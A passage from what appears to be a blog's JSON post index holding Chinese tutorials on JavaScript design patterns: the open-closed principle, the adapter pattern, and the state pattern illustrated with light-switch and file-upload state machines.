代理模式拿预加载图片举例，我们现在已有一个给图片设置src的函数myImage，当我们想为它增加图片预加载功能时，一种做法是改动myImage函数内部的代码，更好的做法是提供一个代理函数proxyMyImage，代理函数负责图片预加载，在图片预加载完成之后，再将请求转交给原来的myImage函数，myImage在这个过程中不需要任何改动。 预加载图片的功能和给图片设置src的功能被隔离在两个函数里，它们可以单独改变而互不影响。myImage不知晓代理的存在，它可以继续专注于自己的职责——给图片设置src。 职责链模式例如把一个巨大的订单函数分别拆成了500元订单、200元订单以及普通订单的3个函数。这3个函数通过职责链连接在一起，客户的请求会在这条链条里面依次传递：123456789101112var order500yuan = new Chain( function( orderType, pay, stock )&#123; // 具 体 代 码 略 &#125;); var order200yuan = new Chain( function( orderType, pay, stock )&#123; // 具 体 代 码 略 &#125;); var orderNormal = new Chain( function( orderType, pay, stock )&#123; // 具 体 代 码 略 &#125;); order500yuan.setNextSuccessor( order200yuan ).setNextSuccessor( orderNormal ); order500yuan.passRequest( 1, true, 10 ); // 500 元 定 金 预 购， 得 到 100 优 惠 券 可以看到，当增加一个新类型的订单函数时，不需要改动原有的订单函数代码，只需要在链条中增加一个新的节点。 开放－封闭原则的相对性在职责链模式代码中，也许会产生疑问：开放-封闭原则要求我们只能通过增加源代码的方式扩展程序的功能，而不允许修改源代码。那当我们往职责链中增加一个新的100元订单函数节点时，不也必须改动设置链条的代码吗？代码如下：1order500yuan.setNextSuccessor(order200yuan).setNextSuccessor(orderNormal); 变为：1order500yuan.setNextSuccessor(order200yuan).setNextSuccessor(order100yuan).setNextSuccessor(orderNormal); 实际上，让程序保持完全封闭是不容易做到的。就算技术上做得到，也需要花费太多的时间和精力。而且让程序符合开放-封闭原则的代价是引入更多的抽象层次，更多的抽象有可能会增大代码的复杂度。 更何况，有一些代码是无论如何也不能完全封闭的，总会存在一些无法对其封闭的变化。作为程序员，可以做到的有下面两点。 挑选出最容易发生变化的地方，然后构造抽象来封闭这些变化。 在不可避免发生修改的时候，尽量修改那些相对容易修改的地方。拿一个开源库来说，修改它提供的配置文件，总比修改它的源代码来得简单。 比如那个巨大的订单函数，它包含了各种订单的逻辑，有500元和200元的，也有普通订单的。这个函数是最有可能发生变化的，一旦增加新的订单，就必须修改这个巨大的函数。而用职责链模式重构之后，我们只需要新增一个节点，然后重新设置链条中节点的连接顺序。重构后的修改方式显然更加清晰简单。 接受第一次愚弄下面这段话引自Bob大叔的《敏捷软件开发原则、模式与实践》。 有句古老的谚语说：“愚弄我一次，应该羞愧的是你。再次愚弄我，应该羞愧的是我。”这也是一种有效的对待软件设计的态度。为了防止软件背着不必要的复杂性，我们会允许自己被愚弄一次。 让程序一开始就尽量遵守开放-封闭原则，并不是一件很容易的事情。一方面，我们需要尽快知道程序在哪些地方会发生变化，这要求我们有一些“未卜先知”的能力。另一方面，留给程序员的需求排期并不是无限的，所以我们可以说服自己去接受不合理的代码带来的第一次愚弄。在最初编写代码的时候，先假设变化永远不会发生，这有利于我们迅速完成需求。当变化发生并且对我们接下来的工作造成影响的时候，可以再回过头来封装这些变化的地方。然后确保我们不会掉进同一个坑里，这有点像星矢说的：“圣斗士不会被同样的招数击倒第二次。”","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-16-适配器模式","slug":"js-pattern16","date":"2017-12-04T15:02:47.000Z","updated":"2017-12-04T15:02:47.000Z","comments":true,"path":"2017/12/04/js-pattern16/","link":"","permalink":"https://github.com/xmoyKING/2017/12/04/js-pattern16/","excerpt":"","text":"适配器模式的作用是解决两个软件实体间的接口不兼容的问题。使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体可以一起工作。适配器的别名是包装器（wrapper），这是一个相对简单的模式。在程序开发中有许多这样的场景：当我们试图调用模块或者对象的某个接口时，却发现这个接口的格式并不符合目前的需求。这时候有两种解决办法，第一种是修改原来的接口实现，但如果原来的模块很复杂，或者我们拿到的模块是一段别人编写的经过压缩的代码，修改原接口就显得不太现实了。第二种办法是创建一个适配器，将原接口转换为客户希望的另一个接口，客户只需要和适配器打交道。 现实中的适配器适配器在现实生活的应用非常广泛，接下来我们来看几个现实生活中的适配器模式。 港式插头转换器港式的电器插头比大陆的电器插头体积要大一些。如果从香港买了一个Macbook，我们会发现充电器无法插在家里的插座上，为此而改造家里的插座显然不方便，所以我们需要一个适配器 电源适配器Macbook电池支持的电压是20V，我们日常生活中的交流电压一般是220V。除了我们了解的220V交流电压，日本和韩国的交流电压大多是100V，而英国和澳大利亚的是240V。笔记本电脑的电源适配器就承担了转换电压的作用，电源适配器使笔记本电脑在100V~240V的电压之内都能正常工作，这也是它为什么被称为电源“适配器”的原因。3.USB转接口在以前的电脑上，PS2接口是连接鼠标、键盘等其他外部设备的标准接口。但随着技术的发展，越来越多的电脑开始放弃了PS2接口，转而仅支持USB接口。所以那些过去生产出来的只拥有PS2接口的鼠标、键盘、游戏手柄等，需要一个USB转接口才能继续正常工作，这是PS2-USB适配器诞生的原因。 适配器模式的应用如果现有的接口已经能够正常工作，那我们就永远不会用上适配器模式。适配器模式是一种“亡羊补牢”的模式，没有人会在程序的设计之初就使用它。因为没有人可以完全预料到未来的事情，也许现在好好工作的接口，未来的某天却不再适用于新系统，那么我们可以用适配器模式把旧接口包装成一个新的接口，使它继续保持生命力。比如在JSON格式流行之前，很多cgi返回的都是XML格式的数据，如果今天仍然想继续使用这些接口，显然我们可以创造一个XML-JSON的适配器。 下面这个实例可以帮助深刻了解适配器模式。当我们向googleMap和baiduMap都发出“显示”请求时，googleMap和baiduMap分别以各自的方式在页面中展现了地图：1234567891011121314151617var googleMap = &#123; show: function() &#123; console.log('开 始 渲 染 谷 歌 地 图'); &#125;&#125;;var baiduMap = &#123; show: function() &#123; console.log('开 始 渲 染 百 度 地 图'); &#125;&#125;;var renderMap = function(map) &#123; if (map.show instanceof Function) &#123; map.show(); &#125; &#125;;renderMap(googleMap); // 输 出： 开 始 渲 染 谷 歌 地 图renderMap(baiduMap); // 输 出： 开 始 渲 染 百 度 地 图 这段程序得以顺利运行的关键是googleMap和baiduMap提供了一致的show方法，但第三方的接口方法并不在我们自己的控制范围之内，假如baiduMap提供的显示地图的方法不叫show而叫display呢？ baiduMap这个对象来源于第三方，正常情况下我们都不应该去改动它。此时我们可以通过增加baiduMapAdapter来解决问题：12var baiduMapAdapter = &#123; show: function()&#123; return baiduMap.display(); &#125; &#125;;renderMap( baiduMapAdapter ); // 输 出： 开 始 渲 染 百 度 地 图 再来看看另外一个例子。假设我们正在编写一个渲染广东省地图的页面。目前从第三方资源里获得了广东省的所有城市以及它们所对应的ID，并且成功地渲染到页面中：123456789101112131415var getGuangdongCity = function() &#123; var guangdongCity = [&#123; name: 'shenzhen', id: 11, &#125;, &#123; name: 'guangzhou', id: 12, &#125;]; return guangdongCity; &#125;;var render = function(fn) &#123; console.log('开 始 渲 染 广 东 省 地 图'); document.write(JSON.stringify(fn())); &#125;;render(getGuangdongCity); 利用这些数据，我们编写完成了整个页面，并且在线上稳定地运行了一段时间。但后来发现这些数据不太可靠，里面还缺少很多城市。于是我们又在网上找到了另外一些数据资源，这次的数据更加全面，但遗憾的是，数据结构和正运行在项目中的并不一致。新的数据结构如下：1var guangdongCity = &#123; shenzhen: 11, guangzhou: 12, zhuhai: 13 &#125;; 除了大动干戈地改写渲染页面的前端代码之外，另外一种更轻便的解决方式就是新增一个数据格式转换的适配器：1234567891011var addressAdapter = function(oldAddressfn) &#123; var address = &#123;&#125;, oldAddress = oldAddressfn(); for (var i = 0, c; c = oldAddress[i + +];) &#123; address[c.name] = c.id; &#125; return function() &#123; return address; &#125; &#125;;render(addressAdapter(getGuangdongCity)); 那么接下来需要做的，就是把代码中调用getGuangdongCity的地方，用经过addressAdapter适配器转换之后的新函数来代替。 小结适配器模式是一对相对简单的模式。在本书提到的设计模式中，有一些模式跟适配器模式的结构非常相似，比如装饰者模式、代理模式和外观模式。这几种模式都属于“包装模式”，都是由一个对象来包装另一个对象。区别它们的关键仍然是模式的意图。 适配器模式主要用来解决两个已有接口之间不匹配的问题，它不考虑这些接口是怎样实现的，也不考虑它们将来可能会如何演化。适配器模式不需要改变已有的接口，就能够使它们协同作用。 装饰者模式和代理模式也不会改变原有对象的接口，但装饰者模式的作用是为了给对象增加功能。装饰者模式常常形成一条长的装饰链，而适配器模式通常只包装一次。代理模式是为了控制对对象的访问，通常也只包装一次。 外观模式的作用倒是和适配器比较相似，有人把外观模式看成一组对象的适配器，但外观模式最显著的特点是定义了一个新的接口。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-15-状态模式","slug":"js-pattern15","date":"2017-12-04T11:28:59.000Z","updated":"2017-12-04T11:28:59.000Z","comments":true,"path":"2017/12/04/js-pattern15/","link":"","permalink":"https://github.com/xmoyKING/2017/12/04/js-pattern15/","excerpt":"","text":"状态模式是一种非同寻常的优秀模式，它也许是解决某些需求场景的最好方法。虽然状态模式并不是一种简单到一目了然的模式（它往往还会带来代码量的增加），但你一旦明白了状态模式的精髓，以后一定会感谢它带给你的无与伦比的好处。 状态模式的关键是区分事物内部的状态，事物内部状态的改变往往会带来事物的行为改变。 初识状态模式我们来想象这样一个场景：有一个电灯，电灯上面只有一个开关。当电灯开着的时候，此时按下开关，电灯会切换到关闭状态；再按一次开关，电灯又将被打开。同一个开关按钮，在不同的状态下，表现出来的行为是不一样的。 现在用代码来描述这个场景，首先定义一个Light类，可以预见，电灯对象light将从Light类创建而出，light对象将拥有两个属性，我们用state来记录电灯当前的状态，用button表示具体的开关按钮。下面来编写这个电灯程序的例子。 第一个例子：电灯程序首先给出不用状态模式的电灯程序实现：1234var Light = function()&#123; this.state = 'off'; // 给 电 灯 设 置 初 始 状 态 off this.button = null; // 电 灯 开 关 按 钮 &#125;; 接下来定义Light.prototype.init方法，该方法负责在页面中创建一个真实的button节点，假设这个button就是电灯的开关按钮，当button的onclick事件被触发时，就是电灯开关被按下的时候，代码如下：123456789Light.prototype.init = function() &#123; var button = document.createElement('button'), self = this; button.innerHTML = '开 关'; this.button = document.body.appendChild(button); this.button.onclick = function() &#123; self.buttonWasPressed(); &#125;&#125;; 当开关被按下时，程序会调用self.buttonWasPressed方法，开关按下之后的所有行为，都将被封装在这个方法里，代码如下：1234567891011Light.prototype.buttonWasPressed = function() &#123; if (this.state === 'off') &#123; console.log('开 灯'); this.state = 'on'; &#125; else if (this.state === 'on') &#123; console.log('关 灯'); this.state = 'off'; &#125;&#125;;var light = new Light();light.init(); OK，现在可以看到，我们已经编写了一个强壮的状态机，这个状态机的逻辑既简单又缜密，看起来这段代码设计得无懈可击，这个程序没有任何bug。实际上这种代码我们已经编写过无数遍，比如要交替切换一个button的class，跟此例一样，往往先用一个变量state来记录按钮的当前状态，在事件发生时，再根据这个状态来决定下一步的行为。 令人遗憾的是，这个世界上的电灯并非只有一种。许多酒店里有另外一种电灯，这种电灯也只有一个开关，但它的表现是：第一次按下打开弱光，第二次按下打开强光，第三次才是关闭电灯。现在必须改造上面的代码来完成这种新型电灯的制造：123456789101112Light.prototype.buttonWasPressed = function() &#123; if (this.state === 'off') &#123; console.log('弱 光'); this.state = 'weakLight'; &#125; else if (this.state === 'weakLight') &#123; console.log('强 光'); this.state = 'strongLight'; &#125; else if (this.state === 'strongLight') &#123; console.log('关 灯'); this.state = 'off'; &#125;&#125;; 现在这个反例先告一段落，我们来考虑一下上述程序的缺点。 很明显buttonWasPressed方法是违反开放-封闭原则的，每次新增或者修改light的状态，都需要改动buttonWasPressed方法中的代码，这使得buttonWasPressed成为了一个非常不稳定的方法。 所有跟状态有关的行为，都被封装在buttonWasPressed方法里，如果以后这个电灯又增加了强强光、超强光和终极强光，那我们将无法预计这个方法将膨胀到什么地步。当然为了简化示例，此处在状态发生改变的时候，只是简单地打印一条log和改变button的innerHTML。在实际开发中，要处理的事情可能比这多得多，也就是说，buttonWasPressed方法要比现在庞大得多。 状态的切换非常不明显，仅仅表现为对state变量赋值，比如this.state=’weakLight’。在实际开发中，这样的操作很容易被程序员不小心漏掉。我们也没有办法一目了然地明白电灯一共有多少种状态，除非耐心地读完buttonWasPressed方法里的所有代码。当状态的种类多起来的时候，某一次切换的过程就好像被埋藏在一个巨大方法的某个阴暗角落里。 状态之间的切换关系，不过是往buttonWasPressed方法里堆砌if、else语句，增加或者修改一个状态可能需要改变若干个操作，这使buttonWasPressed更加难以阅读和维护。 状态模式改进电灯程序使用状态模式改进电灯的程序。通常谈到封装，一般都会优先封装对象的行为，而不是对象的状态。但在状态模式中刚好相反，状态模式的关键是把事物的每种状态都封装成单独的类，跟此种状态有关的行为都被封装在这个类的内部，所以button被按下的的时候，只需要在上下文中，把这个请求委托给当前的状态对象即可，该状态对象会负责渲染它自身的行为，同时我们还可以把状态的切换规则事先分布在状态类中，这样就有效地消除了原本存在的大量条件分支语句: 下面进入状态模式的代码编写阶段，首先将定义3个状态类，分别是OffLightState、WeakLightState、StrongLightState。这3个类都有一个原型方法buttonWasPressed，代表在各自状态下，按钮被按下时将发生的行为，代码如下：12345678910111213141516171819202122232425// OffLightState： var OffLightState = function(light) &#123; this.light = light;&#125;;OffLightState.prototype.buttonWasPressed = function() &#123; console.log('弱 光'); // offLightState 对 应 的 行 为 this.light.setState(this.light.weakLightState); // 切 换 状 态 到 weakLightState &#125;;// WeakLightState： var WeakLightState = function(light) &#123; this.light = light;&#125;;WeakLightState.prototype.buttonWasPressed = function() &#123; console.log('强 光'); // weakLightState 对 应 的 行 为 this.light.setState(this.light.strongLightState); // 切 换 状 态 到 strongLightState &#125;;// StrongLightState： var StrongLightState = function(light) &#123; this.light = light;&#125;;StrongLightState.prototype.buttonWasPressed = function() &#123; console.log('关 灯'); // strongLightState 对 应 的 行 为 this.light.setState(this.light.offLightState); // 切 换 状 态 到 offLightState &#125;; 接下来改写Light类，现在不再使用一个字符串来记录当前的状态，而是使用更加立体化的状态对象。我们在Light类的构造函数里为每个状态类都创建一个状态对象，这样一来我们可以很明显地看到电灯一共有多少种状态，代码如下：123456var Light = function() &#123; this.offLightState = new OffLightState(this); this.weakLightState = new WeakLightState(this); this.strongLightState = new StrongLightState(this); this.button = null;&#125;; 在button按钮被按下的事件里，Context也不再直接进行任何实质性的操作，而是通过self.currState.buttonWasPressed()将请求委托给当前持有的状态对象去执行，代码如下：12345678910Light.prototype.init = function() &#123; var button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = '开 关'; this.currState = this.offLightState; // 设 置 当 前 状 态 this.button.onclick = function() &#123; self.currState.buttonWasPressed(); &#125;&#125;; 最后还要提供一个Light.prototype.setState方法，状态对象可以通过这个方法来切换light对象的状态。前面已经说过，状态的切换规律事先被完好定义在各个状态类中。在Context中再也找不到任何一个跟状态切换相关的条件分支语句：1Light.prototype.setState = function( newState )&#123; this.currState = newState; &#125;; 测试：12var light = new Light(); light.init(); 不出意外的话，执行结果跟之前的代码一致，但是使用状态模式的好处很明显，它可以使每一种状态和它对应的行为之间的关系局部化，这些行为被分散和封装在各自对应的状态类之中，便于阅读和管理代码。 另外，状态之间的切换都被分布在状态类内部，这使得我们无需编写过多的if、else条件分支语言来控制状态之间的转换。 当我们需要为light对象增加一种新的状态时，只需要增加一个新的状态类，再稍稍改变一些现有的代码即可。假设现在light对象多了一种超强光的状态，那就先增加SuperStrongLightState类：1234567var SuperStrongLightState = function(light) &#123; this.light = light; &#125;;SuperStrongLightState.prototype.buttonWasPressed = function() &#123; console.log('关 灯'); this.light.setState(this.light.offLightState);&#125;; 然后在Light构造函数里新增一个superStrongLightState对象：1234567var Light = function() &#123; this.offLightState = new OffLightState(this); this.weakLightState = new WeakLightState(this); this.strongLightState = new StrongLightState(this); this.superStrongLightState = new SuperStrongLightState(this); // 新 增 superStrongLightState 对 象 this.button = null; &#125;; 最后改变状态类之间的切换规则，从StrongLightState—-&gt;OffLightState变为StrongLightState—-&gt;SuperStrongLightState—-&gt;OffLightState：1234StrongLightState.prototype.buttonWasPressed = function()&#123; console.log( '超 强 光' ); // strongLightState 对 应 的 行 为 this.light.setState( this.light.superStrongLightState ); // 切 换 状 态 到 superStrongLightState &#125;; 状态模式的定义通过电灯的例子，对于状态模式已经有了一定程度的了解。现在回头来看GoF中对状态模式的定义： 允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。 以逗号分割，把这句话分为两部分来看。 第一部分的意思是将状态封装成独立的类，并将请求委托给当前的状态对象，当对象的内部状态改变时，会带来不同的行为变化。电灯的例子足以说明这一点，在off和on这两种不同的状态下，点击同一个按钮，得到的行为反馈是截然不同的。 第二部分是从客户的角度来看，使用的对象在不同的状态下具有截然不同的行为，这个对象看起来是从不同的类中实例化而来的，实际上这是使用了委托的效果。 状态模式的通用结构在前面的电灯例子中，完成了一个状态模式程序的编写。首先定义了Light类，Light类在这里也被称为上下文（Context）。随后在Light的构造函数中，要创建每一个状态类的实例对象，Context将持有这些状态对象的引用，以便把请求委托给状态对象。用户的请求，即点击button的动作也是实现在Context中的，代码如下：1234567891011121314151617var Light = function() &#123; this.offLightState = new OffLightState(this); // 持 有 状 态 对 象 的 引 用 this.weakLightState = new WeakLightState(this); this.strongLightState = new StrongLightState(this); this.superStrongLightState = new SuperStrongLightState(this); this.button = null; &#125;;Light.prototype.init = function() &#123; var button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = '开 关'; this.currState = this.offLightState; // 设 置 默 认 初 始 状 态 this.button.onclick = function() &#123; // 定 义 用 户 的 请 求 动 作 self.currState.buttonWasPressed(); &#125;&#125;; 接下来可能是个苦力活，要编写各种状态类，light对象被传入状态类的构造函数，状态对象也需要持有light对象的引用，以便调用light中的方法或者直接操作light对象：123456var OffLightState = function( light )&#123; this.light = light; &#125;; OffLightState.prototype.buttonWasPressed = function()&#123; console.log( '弱 光' ); this.light.setState( this.light.weakLightState ); &#125;; 缺少抽象类的变通方式在状态类中将定义一些共同的行为方法，Context最终会将请求委托给状态对象的这些方法，在这个例子里，这个方法就是buttonWasPressed。无论增加了多少种状态类，它们都必须实现buttonWasPressed方法。 在Java中，所有的状态类必须继承自一个State抽象父类，当然如果没有共同的功能值得放入抽象父类中，也可以选择实现State接口。这样做的原因一方面是向上转型，另一方面是保证所有的状态子类都实现了buttonWasPressed方法。遗憾的是，JavaScript既不支持抽象类，也没有接口的概念。所以在使用状态模式的时候要格外小心，如果编写一个状态子类时，忘记了给这个状态子类实现buttonWasPressed方法，则会在状态切换的时候抛出异常。因为Context总是把请求委托给状态对象的buttonWasPressed方法。 不论怎样严格要求程序员，也许都避免不了犯错的那一天，毕竟如果没有编译器的帮助，只依靠程序员的自觉以及一点好运气，是不靠谱的。这里建议的解决方案跟《模板方法模式》中一致，让抽象父类的抽象方法直接抛出一个异常，这个异常至少会在程序运行期间就被发现：123456789101112var State = function() &#123;&#125;;State.prototype.buttonWasPressed = function() &#123; throw new Error('父 类 的 buttonWasPressed 方 法 必 须 被 重 写');&#125;;var SuperStrongLightState = function(light) &#123; this.light = light; &#125;;SuperStrongLightState.prototype = new State(); // 继 承 抽 象 父 类 SuperStrongLightState.prototype.buttonWasPressed = function() &#123; // 重 写 buttonWasPressed 方 法 console.log('关 灯'); this.light.setState(this.light.offLightState);&#125;; 另一个状态模式示例——文件上传源自作者的一个项目，微云上传模块，实际上，不论是文件上传，还是音乐、视频播放器，都可以找到一些明显的状态区分。比如文件上传程序中有扫描、正在上传、暂停、上传成功、上传失败这几种状态，音乐播放器可以分为加载中、正在播放、暂停、播放完毕这几种状态。点击同一个按钮，在上传中和暂停状态下的行为表现是不一样的，同时它们的样式class也不同。 以文件上传为例进行说明。上传中，点击按钮暂停,暂停中，点击按钮继续播放，看到这里，再联系一下电灯的例子和之前对状态模式的了解，已经找了使用状态模式的理由。 更复杂的切换条件相对于电灯的例子，文件上传不同的地方在于，条件切换关系更加复杂。在电灯的例子中，电灯的状态总是从关到开再到关，或者从关到弱光、弱光到强光、强光再到关。看起来总是循规蹈矩的A→B→C→A，所以即使不使用状态模式来编写电灯的程序，而是使用原始的if、else来控制状态切换，我们也不至于在逻辑编写中迷失自己，因为状态的切换总是遵循一些简单的规律，代码如下：12345678910111213if (this.state === 'off') &#123; console.log('开 弱 光'); this.button.innerHTML = '下 一 次 按 我 是 强 光'; this.state = 'weakLight';&#125; else if (this.state === 'weakLight') &#123; console.log('开 强 光'); this.button.innerHTML = '下 一 次 按 我 是 关 灯'; this.state = 'strongLight';&#125; else if (this.state === 'strongLight') &#123; console.log('关 灯'); this.button.innerHTML = '下 一 次 按 我 是 弱 光'; this.state = 'off';&#125; 而文件上传的状态切换相比要复杂得多，控制文件上传的流程需要两个节点按钮，第一个用于暂停和继续上传，第二个用于删除文件， 现在看看文件在不同的状态下，点击这两个按钮将分别发生什么行为。 文件在扫描状态中，是不能进行任何操作的，既不能暂停也不能删除文件，只能等待扫描完成。扫描完成之后，根据文件的md5值判断，若确认该文件已经存在于服务器，则直接跳到上传完成状态。如果该文件的大小超过允许上传的最大值，或者该文件已经损坏，则跳往上传失败状态。剩下的情况下才进入上传中状态。 上传过程中可以点击暂停按钮来暂停上传，暂停后点击同一个按钮会继续上传。 扫描和上传过程中，点击删除按钮无效，只有在暂停、上传完成、上传失败之后，才能删除文件。 一些准备工作有一些浏览器插件帮助完成文件上传。插件类型根据浏览器的不同，有可能是ActiveObject，也有可能是WebkitPlugin。 上传是一个异步的过程，所以控件会不停地调用JavaScript提供的一个全局函数window.external.upload，来通知JavaScript目前的上传进度，控件会把当前的文件状态作为参数state塞进window.external.upload。可以简单地用setTimeout来模拟文件的上传进度，window.external.upload函数在此例中也只负责打印一些log：123window.external.upload = function(state) &#123; console.log(state); // 可 能 为 sign、 uploading、 done、 error&#125;; 另外我们需要在页面中放置一个用于上传的插件对象：12345678910111213141516171819202122var plugin = (function() &#123; var plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function() &#123; console.log('开 始 文 件 扫 描'); &#125; plugin.pause = function() &#123; console.log('暂 停 文 件 上 传'); &#125;; plugin.uploading = function() &#123; console.log('开 始 文 件 上 传'); &#125;; plugin.del = function() &#123; console.log('删 除 文 件 上 传'); &#125; plugin.done = function() &#123; console.log('文 件 上 传 完 成'); &#125; document.body.appendChild(plugin); return plugin;&#125;)(); 开始编写代码接下来开始完成其他代码，先定义Upload类，控制上传过程的对象将从Upload类中创建而来：1234567var Upload = function(fileName) &#123; this.plugin = plugin; this.fileName = fileName; this.button1 = null; this.button2 = null; this.state = 'sign'; // 设 置 初 始 状 态 为 waiting &#125;; Upload.prototype.init方法会进行一些初始化工作，包括创建页面中的一些节点。在这些节点里，起主要作用的是两个用于控制上传流程的按钮，第一个按钮用于暂停和继续上传，第二个用于删除文件：123456789101112Upload.prototype.init = function() &#123; var that = this; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt; 文 件 名 称:' + this.fileName + ' &lt;/span&gt;\\ &lt;button data-action=\"button1\"&gt; 扫 描 中 &lt;/button&gt;\\ &lt;button data-action=\"button2\"&gt; 删 除 &lt;/button&gt;'; document.body.appendChild(this.dom); this.button1 = this.dom.querySelector('[data-action=\"button1\"]'); // 第 一 个 按 钮 this.button2 = this.dom.querySelector('[data-action=\"button2\"]'); // 第 二 个 按 钮 this.bindEvent();&#125;; 接下来需要给两个按钮分别绑定点击事件：12345678910111213141516171819202122232425Upload.prototype.bindEvent = function() &#123; var self = this; this.button1.onclick = function() &#123; if (self.state === 'sign') &#123; // 扫 描 状 态 下， 任 何 操 作 无 效 console.log('扫 描 中， 点 击 无 效...'); &#125; else if (self.state === 'uploading') &#123; // 上 传 中， 点 击 切 换 到 暂 停 self.changeState('pause'); &#125; else if (self.state === 'pause') &#123; // 暂 停 中， 点 击 切 换 到 上 传 中 self.changeState('uploading'); &#125; else if (self.state === 'done') &#123; console.log('文 件 已 完 成 上 传, 点 击 无 效'); &#125; else if (self.state === 'error') &#123; console.log('文 件 上 传 失 败, 点 击 无 效'); &#125; &#125;; this.button2.onclick = function() &#123; if (self.state === 'done' || self.state === 'error' || self.state === 'pause') &#123; // 上 传 完 成、 上 传 失 败 和 暂 停 状 态 下 可 以 删 除 self.changeState('del'); &#125; else if (self.state === 'sign') &#123; console.log('文 件 正 在 扫 描 中， 不 能 删 除'); &#125; else if (self.state === 'uploading') &#123; console.log('文 件 正 在 上 传 中， 不 能 删 除'); &#125; &#125;;&#125;; 再接下来是Upload.prototype.changeState方法，它负责切换状态之后的具体行为，包括改变按钮的innerHTML，以及调用插件开始一些“真正”的操作：1234567891011121314151617181920212223242526272829Upload.prototype.changeState = function(state) &#123; switch (state) &#123; case 'sign': this.plugin.sign(); this.button1.innerHTML = '扫 描 中， 任 何 操 作 无 效'; break; case 'uploading': this.plugin.uploading(); this.button1.innerHTML = '正 在 上 传， 点 击 暂 停'; break; case 'pause': this.plugin.pause(); this.button1.innerHTML = '已 暂 停， 点 击 继 续 上 传'; break; case 'done': this.plugin.done(); this.button1.innerHTML = '上 传 完 成'; break; case 'error': this.button1.innerHTML = '上 传 失 败'; break; case 'del': this.plugin.del(); this.dom.parentNode.removeChild(this.dom); console.log('删 除 完 成'); break; &#125; this.state = state;&#125;; 最后我们来进行一些测试工作：123456789101112var uploadObj = new Upload('JavaScript 设 计 模 式 与 开 发 实 践');uploadObj.init();window.external.upload = function(state) &#123; // 插 件 调 用 JavaScript 的 方 法 uploadObj.changeState(state);&#125;;window.external.upload('sign'); // 文 件 开 始 扫 描 setTimeout(function() &#123; window.external.upload('uploading'); // 1 秒 后 开 始 上 传 &#125;, 1000);setTimeout(function() &#123; window.external.upload('done'); // 5 秒 后 上 传 完 成&#125;, 5000); 至此就完成了一个简单的文件上传程序的编写。当然这仍然是一个反例，这里的缺点跟电灯例子中的第一段代码一样，程序中充斥着if、else条件分支，状态和行为都被耦合在一个巨大的方法里，我们很难修改和扩展这个状态机。文件状态之间的联系如此复杂，这个问题显得更加严重了。 状态模式重构文件上传程序状态模式在文件上传的程序中，是最优雅的解决办法之一。 通过电灯的例子，已经熟知状态模式的结构了，下面就开始一步步地重构它。 第一步仍然是提供window.external.upload函数，在页面中模拟创建上传插件，这部分代码没有改变。 第二步，改造Upload构造函数，在构造函数中为每种状态子类都创建一个实例对象：123456789101112var Upload = function(fileName) &#123; this.plugin = plugin; this.fileName = fileName; this.button1 = null; this.button2 = null; this.signState = new SignState(this); // 设 置 初 始 状 态 为 waiting this.uploadingState = new UploadingState(this); this.pauseState = new PauseState(this); this.doneState = new DoneState(this); this.errorState = new ErrorState(this); this.currState = this.signState; // 设 置 当 前 状 态 &#125;; 第三步，Upload.prototype.init方法无需改变，仍然负责往页面中创建跟上传流程有关的DOM节点，并开始绑定按钮的事件：123456789101112Upload.prototype.init = function() &#123; var that = this; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt; 文 件 名 称:' + this.fileName + ' &lt;/span&gt;\\ &lt;button data-action=\"button1\"&gt; 扫 描 中 &lt;/button&gt;\\ &lt;button data-action=\"button2\"&gt; 删 除 &lt;/button&gt;'; document.body.appendChild(this.dom); this.button1 = this.dom.querySelector('[data-action=\"button1\"]'); this.button2 = this.dom.querySelector('[data-action=\"button2\"]'); this.bindEvent();&#125;; 第四步，负责具体的按钮事件实现，在点击了按钮之后，Context并不做任何具体的操作，而是把请求委托给当前的状态类来执行：123456789Upload.prototype.bindEvent = function() &#123; var self = this; this.button1.onclick = function() &#123; self.currState.clickHandler1(); &#125; this.button2.onclick = function() &#123; self.currState.clickHandler2(); &#125;&#125;; 第四步中的代码有一些变化，把状态对应的逻辑行为放在Upload类中：123456789101112131415161718192021222324252627Upload.prototype.sign = function() &#123; this.plugin.sign(); this.currState = this.signState;&#125;;Upload.prototype.uploading = function() &#123; this.button1.innerHTML = '正 在 上 传， 点 击 暂 停'; this.plugin.uploading(); this.currState = this.uploadingState;&#125;;Upload.prototype.pause = function() &#123; this.button1.innerHTML = '已 暂 停， 点 击 继 续 上 传'; this.plugin.pause(); this.currState = this.pauseState;&#125;;Upload.prototype.done = function() &#123; this.button1.innerHTML = '上 传 完 成'; this.plugin.done(); this.currState = this.doneState;&#125;;Upload.prototype.error = function() &#123; this.button1.innerHTML = '上 传 失 败'; this.currState = this.errorState;&#125;;Upload.prototype.del = function() &#123; this.plugin.del(); this.dom.parentNode.removeChild(this.dom);&#125;; 第五步，工作略显乏味，编写各个状态类的实现。值得注意的是，我们使用了StateFactory，从而避免因为JavaScript中没有抽象类所带来的问题。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859var StateFactory = (function() &#123; var State = function() &#123;&#125;; State.prototype.clickHandler1 = function() &#123; throw new Error('子 类 必 须 重 写 父 类 的 clickHandler1 方 法'); &#125; State.prototype.clickHandler2 = function() &#123; throw new Error('子 类 必 须 重 写 父 类 的 clickHandler2 方 法'); &#125; return function(param) &#123; var F = function(uploadObj) &#123; this.uploadObj = uploadObj; &#125;; F.prototype = new State(); for (var i in param) &#123; F.prototype[i] = param[i]; &#125; return F; &#125;&#125;)();var SignState = StateFactory(&#123; clickHandler1: function() &#123; console.log('扫 描 中， 点 击 无 效...'); &#125;, clickHandler2: function() &#123; console.log('文 件 正 在 上 传 中， 不 能 删 除'); &#125;&#125;);var UploadingState = 